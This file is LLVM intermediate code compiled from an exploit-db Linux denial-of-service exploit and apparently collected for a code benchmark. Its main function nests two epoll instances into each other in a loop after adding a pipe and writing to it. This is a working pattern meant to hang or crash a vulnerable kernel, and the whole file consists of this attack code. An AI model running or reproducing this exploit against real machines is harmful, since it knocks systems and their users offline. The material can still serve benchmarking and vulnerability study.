; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_35403.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_35403.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.epoll_event = type { i32 }

@EPOLLIN = common dso_local global i32 0, align 4
@EPOLL_CTL_ADD = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [2 x i32], align 4
  %5 = alloca %struct.epoll_event, align 4
  store i32 0, i32* %1, align 4
  %6 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %5, i32 0, i32 0
  %7 = load i32, i32* @EPOLLIN, align 4
  store i32 %7, i32* %6, align 4
  %8 = call i32 @epoll_create(i32 1)
  store i32 %8, i32* %2, align 4
  %9 = call i32 @epoll_create(i32 2)
  store i32 %9, i32* %3, align 4
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 0
  %11 = call i32 @pipe(i32* %10)
  %12 = load i32, i32* %3, align 4
  %13 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %14 = load i32, i32* %2, align 4
  %15 = call i32 @epoll_ctl(i32 %12, i32 %13, i32 %14, %struct.epoll_event* %5)
  %16 = load i32, i32* %2, align 4
  %17 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %18 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 0
  %19 = load i32, i32* %18, align 4
  %20 = call i32 @epoll_ctl(i32 %16, i32 %17, i32 %19, %struct.epoll_event* %5)
  %21 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 1
  %22 = load i32, i32* %21, align 4
  %23 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 0
  %24 = call i32 @write(i32 %22, i32* %23, i32 8)
  %25 = load i32, i32* %2, align 4
  %26 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %27 = load i32, i32* %3, align 4
  %28 = call i32 @epoll_ctl(i32 %25, i32 %26, i32 %27, %struct.epoll_event* %5)
  ret i32 0
}

declare dso_local i32 @epoll_create(i32) #1

declare dso_local i32 @pipe(i32*) #1

declare dso_local i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

declare dso_local i32 @write(i32, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
